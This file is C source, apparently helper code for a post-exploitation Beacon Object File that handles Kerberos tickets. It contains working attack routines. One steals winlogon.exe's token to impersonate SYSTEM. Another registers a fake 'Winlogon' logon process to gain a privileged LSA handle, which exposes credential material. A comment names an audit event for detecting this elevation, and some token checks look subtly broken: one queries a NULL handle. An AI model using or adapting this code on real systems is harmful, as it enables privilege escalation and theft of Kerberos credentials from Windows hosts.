#include "common.h"

HANDLE GetCurrentToken(DWORD DesiredAccess) {
    HANDLE hCurrentToken = NULL;
    if (!ADVAPI32$OpenThreadToken(KERNEL32$GetCurrentThread(), DesiredAccess, FALSE, &hCurrentToken)) {
        if (hCurrentToken == NULL && KERNEL32$GetLastError() == ERROR_NO_TOKEN) {
            if (!ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(), DesiredAccess, &hCurrentToken)) {
                return NULL;
            }
        }
    }
    return hCurrentToken;
}

char* GetEncryptionTypeString(LONG encType) {
    char* encTypeStr = NULL;
    switch (encType) {
        case DES_CBC_CRC:
            encTypeStr = "DES_CBC_CRC";
            break;
        case DES_CBC_MD4:
            encTypeStr = "DES_CBC_MD4";
            break;
        case DES_CBC_MD5:
            encTypeStr = "DES_CBC_MD5";
            break;
        case DES3_CBC_MD5:
            encTypeStr = "DES3_CBC_MD5";
            break;
        case DES3_CBC_SHA1:
            encTypeStr = "DES3_CBC_SHA1";
            break;
        case DSAWITHSHA1_CMSOID:
            encTypeStr = "DSAWITHSHA1_CMSOID";
            break;
        case MD5WITHRSAENCRYPTION_CMSOID:
            encTypeStr = "MD5WITHRSAENCRYPTION_CMSOID";
            break;
        case SHA1WITHRSAENCRYPTION_CMSOID:
            encTypeStr = "SHA1WITHRSAENCRYPTION_CMSOID";
            break;
        case RC2CBC_ENVOID:
            encTypeStr = "RC2CBC_ENVOID";
            break;
        case RSAENCRYPTION_ENVOID:
            encTypeStr = "RSAENCRYPTION_ENVOID";
            break;
        case RSAES_OAEP_ENV_OID:
            encTypeStr = "RSAES_OAEP_ENV_OID";
            break;
        case DES3_CBC_SHA1_KD:
            encTypeStr = "DES3_CBC_SHA1_KD";
            break;
        case AES128_CTS_HMAC_SHA1:
            encTypeStr = "AES128_CTS_HMAC_SHA1";
            break;
        case AES256_CTS_HMAC_SHA1:
            encTypeStr = "AES256_CTS_HMAC_SHA1";
            break;
        case RC4_HMAC:
            encTypeStr = "RC4_HMAC";
            break;
        case RC4_HMAC_EXP:
            encTypeStr = "RC4_HMAC_EXP";
            break;
        case SUBKEY_KEYMATERIAL:
            encTypeStr = "SUBKEY_KEYMATERIAL";
            break;
        case OLD_EXP:
            encTypeStr = "OLD_EXP";
            break;
        default:
            encTypeStr = "<unknown>";
            break;
    }
    return encTypeStr;
}

SYSTEMTIME ConvertToSystemtime(LARGE_INTEGER li) {
    FILETIME ft;
    SYSTEMTIME st_utc;
    ft.dwHighDateTime = li.HighPart;
    ft.dwLowDateTime = li.LowPart;
    KERNEL32$FileTimeToSystemTime(&ft, &st_utc);
    return st_utc;
}

BOOL IsHighIntegrity(HANDLE TokenHandle) {
    BOOL b;
    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    PSID AdministratorsGroup;
    b = ADVAPI32$AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0,
                                          0, 0, 0, 0, &AdministratorsGroup);
    if (b) {
        if (!ADVAPI32$CheckTokenMembership(NULL, AdministratorsGroup, &b)) {
            b = FALSE;
        }
        ADVAPI32$FreeSid(AdministratorsGroup);
    }

    return b;
}

BOOL IsSystem(HANDLE TokenHandle) {
    HANDLE hToken = NULL;
    UCHAR bTokenUser[sizeof(TOKEN_USER) + 8 + 4 * SID_MAX_SUB_AUTHORITIES];
    PTOKEN_USER pTokenUser = (PTOKEN_USER)bTokenUser;
    ULONG cbTokenUser;
    SID_IDENTIFIER_AUTHORITY siaNT = SECURITY_NT_AUTHORITY;
    PSID pSystemSid;
    BOOL bSystem;

    if (!ADVAPI32$GetTokenInformation(hToken, TokenUser, pTokenUser, sizeof(bTokenUser), &cbTokenUser)) {
        return FALSE;
    }

    if (!ADVAPI32$AllocateAndInitializeSid(&siaNT, 1, SECURITY_LOCAL_SYSTEM_RID, 0, 0, 0, 0, 0, 0, 0, &pSystemSid))
        return FALSE;

    bSystem = ADVAPI32$EqualSid(pTokenUser->User.Sid, pSystemSid);
    ADVAPI32$FreeSid(pSystemSid);
    return bSystem;
}

NTSTATUS GetLsaHandle(HANDLE hToken, BOOL highIntegrity, HANDLE* hLsa) {
    HANDLE hLsaLocal;
    LSA_OPERATIONAL_MODE mode = 0;
    NTSTATUS status = STATUS_SUCCESS;
    if (!highIntegrity) {
        status = SECUR32$LsaConnectUntrusted(&hLsaLocal);
        if (!NT_SUCCESS(status)) {
            status = ADVAPI32$LsaNtStatusToWinError(status);
        }
    } else {
        // AuditPol.exe /set /subcategory:"Security System Extension"
        // /success:enable /failure:enable Event ID 4611 Note: detect elevation via
        // winlogon.exe.
        char* name = "Winlogon";
        STRING lsaString = (STRING){.Length = 8, .MaximumLength = 9, .Buffer = name};
        SECUR32$LsaRegisterLogonProcess(&lsaString, &hLsaLocal, &mode);
        if (hLsaLocal == NULL) {
            if (IsSystem(hToken)) {
                status = SECUR32$LsaRegisterLogonProcess(&lsaString, &hLsaLocal, &mode);
                if (!NT_SUCCESS(status)) {
                    status = ADVAPI32$LsaNtStatusToWinError(status);
                }
            } else {
                if (ElevateToSystem()) {
                    status = SECUR32$LsaRegisterLogonProcess(&lsaString, &hLsaLocal, &mode);
                    if (!NT_SUCCESS(status)) {
                        status = ADVAPI32$LsaNtStatusToWinError(status);
                    }
                    ADVAPI32$RevertToSelf();
                } else {
                    status = KERNEL32$GetLastError();
                }
            }
        }
    }

    *hLsa = hLsaLocal;
    return status;
}

int GetProcessIdByName(WCHAR* processName) {
    HANDLE hProcessSnap;
    PROCESSENTRY32W pe32;
    int pid = -1;

    hProcessSnap = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        return pid;
    }

    pe32.dwSize = sizeof(PROCESSENTRY32W);
    if (!KERNEL32$Process32FirstW(hProcessSnap, &pe32)) {
        KERNEL32$CloseHandle(hProcessSnap);
        return pid;
    }

    do {
        WCHAR* procName = pe32.szExeFile;
        if (MSVCRT$wcscmp(procName, processName) == 0) {
            pid = pe32.th32ProcessID;
            break;
        }

    } while (KERNEL32$Process32NextW(hProcessSnap, &pe32));
    KERNEL32$CloseHandle(hProcessSnap);
    return pid;
}

BOOL ElevateToSystem() {
    int pid = GetProcessIdByName(L"winlogon.exe");
    if (pid == -1) {
        return FALSE;
    }
    BOOL res = FALSE;
    HANDLE hProcess = KERNEL32$OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (hProcess != NULL) {
        HANDLE hDupToken;
        HANDLE hToken;
        if (ADVAPI32$OpenProcessToken(hProcess, TOKEN_DUPLICATE, &hToken)) {
            if (hToken != NULL) {
                if (ADVAPI32$DuplicateToken(hToken, SecurityImpersonation, &hDupToken)) {
                    if (ADVAPI32$ImpersonateLoggedOnUser(hDupToken)) {
                        res = TRUE;
                    }
                    KERNEL32$CloseHandle(hDupToken);
                }
                KERNEL32$CloseHandle(hToken);
            }
        }

        KERNEL32$CloseHandle(hProcess);
    }
    return res;
}

char* GetNarrowStringFromUnicode(UNICODE_STRING src) {
    int len = src.Length / sizeof(WCHAR);
    char* dest = (char*)MSVCRT$calloc(len + 1, sizeof(char));
    if (dest == NULL) {
        return "(mem_alloc_error)";
    }
    MSVCRT$wcstombs(dest, src.Buffer, len);
    dest[len] = '\0';
    return dest;
}

char* GetNarrowString(WCHAR* src) {
    int len = MSVCRT$wcslen(src);
    char* dest = (char*)MSVCRT$calloc(len + 1, sizeof(char));
    if (dest == NULL) {
        return "(mem_alloc_error)";
    }
    MSVCRT$wcstombs(dest, src, len);
    dest[len] = '\0';
    return dest;
}

WCHAR* GetWideString(char* src) {
    int len = MSVCRT$strlen(src);
    WCHAR* dest = (WCHAR*)MSVCRT$calloc(len + 1, sizeof(WCHAR));
    if (dest == NULL) {
        return NULL;
    }
    MSVCRT$mbstowcs(dest, src, len);
    return dest;
}